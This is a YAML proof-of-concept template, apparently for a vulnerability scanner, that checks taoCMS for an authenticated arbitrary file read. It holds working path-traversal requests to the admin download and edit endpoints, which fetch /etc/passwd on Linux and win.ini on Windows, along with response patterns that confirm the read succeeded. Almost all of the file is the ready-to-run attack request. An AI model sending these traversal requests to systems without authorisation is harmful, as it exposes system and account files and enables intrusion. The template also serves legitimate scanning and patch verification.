name: poc-yaml-taocms-arbitary-fileread
binding: 0b1f3564-3add-4eb0-889b-561ec2d51f4a
manual: true
detail:
    author: Mio
    links:
        - https://github.com/taogogo/taocms/issues/13
    vulnerability:
        id: CT-227090
        level: medium
    check_action: 需要登录后台
transport: http
set:
    referer: request.url
rules:
    linux:
        request:
            cache: true
            method: GET
            path: /admin.php?action=file&ctrl=download&path=../../../../../../../../etc/passwd
            headers:
                Referer: '{{referer}}/admin/admin.php?action=file&ctrl=lists'
        expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
    windows:
        request:
            cache: true
            method: GET
            path: /admin.php?action=file&ctrl=edit&path=../../../../../../../../Windows/win.ini
            headers:
                Referer: '{{referer}}/admin.php?action=download&ctrl=lists'
        expression: response.status == 200 && response.body.bcontains(b"for 16-bit app support")
expression: linux() || windows()
